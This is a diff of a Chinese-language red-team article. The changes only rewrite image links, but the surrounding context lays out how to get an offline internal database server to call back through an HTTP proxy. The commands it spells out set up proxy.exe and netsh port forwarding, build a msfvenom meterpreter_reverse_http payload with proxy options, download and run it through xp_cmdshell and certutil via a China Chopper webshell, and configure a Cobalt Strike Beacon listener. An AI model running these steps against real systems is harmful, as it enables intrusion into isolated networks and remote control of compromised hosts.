@@ -55,7 +55,7 @@ http代理方式上线不出网主机的利用姿势，结合上篇文章阅读�
     
     C:\ProgramData\proxy.exe http -t tcp -p "0.0.0.0:8080" --daemon
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210810121123.png)  
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210810121123.png)  
 
 0.0.0.0/127.0.0.1区别：
 
@@ -79,7 +79,7 @@ http代理方式上线不出网主机的利用姿势，结合上篇文章阅读�
     删除端口转发netsh interface portproxy delete v4tov4 listenaddress=192.168.186.3 listenport=8888  
     显示所有端口转发netsh interface portproxy show all
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210810121128.png)  
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210810121128.png)  
 
 用msfvenom命令生成个`meterpreter_reverse_http`载荷文件，需要加上以下几个HTTP代理参数，填入186不出网段内网IP的HTTP代理：http://192.168.186.3:8080
 
@@ -95,7 +95,7 @@ http代理方式上线不出网主机的利用姿势，结合上篇文章阅读�
     
     msfvenom -p windows/x64/meterpreter_reverse_http LHOST=192.168.56.101 LPORT=443 HttpProxyType=HTTP HttpProxyHost=192.168.186.3 HttpProxyPort=8080 -f exe > /tmp/stageless.exe
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210810121129.png)  
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210810121129.png)  
 
 利用中国菜刀的上传/下载功能将该文件放至192.168.186.3的Web服务器中供192.168.186.4断网数据库服务器下载，执行以下命令将`stageless.exe`下载至断网机磁盘中。
 
@@ -105,7 +105,7 @@ http代理方式上线不出网主机的利用姿势，结合上篇文章阅读�
     
     EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://192.168.186.3/stageless.exe C:\ProgramData\stageless.exe'
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210810121130.png)  
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210810121130.png)  
 
 handler监听模块这里必须也要用`meterpreter_reverse_http`，配置好相关选项后执行监听，然后在中国菜刀中利用xp_cmdshell组件执行`stageless.exe`后即可成功上线。‍
 
@@ -130,7 +130,7 @@ handler监听模块这里必须也要用`meterpreter_reverse_http`，配置好�
 
 `httpproxytype、httpproxyhost、httpproxyport`这几个高级参数选项在`options`命令中是看不到的，需要用`advanced`命令才可看到，如下图。
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210810121131.png)  
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210810121131.png)  
 
 如需上线至CobaltStrike则可以创建一个新的监听器，有效载荷选择为Beacon HTTP，在HTTP
 Proxy处填写代理地址：http://192.168.186.3:8080。
@@ -139,7 +139,7 @@ Proxy处填写代理地址：http://192.168.186.3:8080。
 
 将在`Windows Executable(S)`生成的可执行马儿文件上传/下载至192.168.186.4断网数据库服务器中执行即可成功上线。
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210810121133.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210810121133.png)
 
   
 
@@ -169,7 +169,7 @@ Executable(S)，否则其他马儿即使执行成功也不会上线。
   
   
   
-[![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210810121134.png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247487086&idx=1&sn=37fa19dd8ddad930c0d60c84e63f7892&chksm=cfa6aa7df8d1236bb49410e03a1678d69d43014893a597a6690a9a97af6eb06c93e860aa6836&scene=21#wechat_redirect)[![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210810121135.png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486961&idx=1&sn=d02db4cfe2bdf3027415c76d17375f50&chksm=cfa6a9e2f8d120f4c9e4d8f1a7cd50a1121253cb28cc3222595e268bd869effcbb09658221ec&scene=21#wechat_redirect)[![]()](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486327&idx=1&sn=71fc57dc96c7e3b1806993ad0a12794a&chksm=cfa6af64f8d1267259efd56edab4ad3cd43331ec53d3e029311bae1da987b2319a3cb9c0970e&scene=21#wechat_redirect)
+[![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210810121134.png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247487086&idx=1&sn=37fa19dd8ddad930c0d60c84e63f7892&chksm=cfa6aa7df8d1236bb49410e03a1678d69d43014893a597a6690a9a97af6eb06c93e860aa6836&scene=21#wechat_redirect)[![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210810121135.png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486961&idx=1&sn=d02db4cfe2bdf3027415c76d17375f50&chksm=cfa6a9e2f8d120f4c9e4d8f1a7cd50a1121253cb28cc3222595e268bd869effcbb09658221ec&scene=21#wechat_redirect)[![]()](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486327&idx=1&sn=71fc57dc96c7e3b1806993ad0a12794a&chksm=cfa6af64f8d1267259efd56edab4ad3cd43331ec53d3e029311bae1da987b2319a3cb9c0970e&scene=21#wechat_redirect)
 
 * * *
 
@@ -177,7 +177,7 @@ Executable(S)，否则其他马儿即使执行成功也不会上线。
 
   
   
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210810121136.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210810121136.png)
 
 预览时标签不可点
 
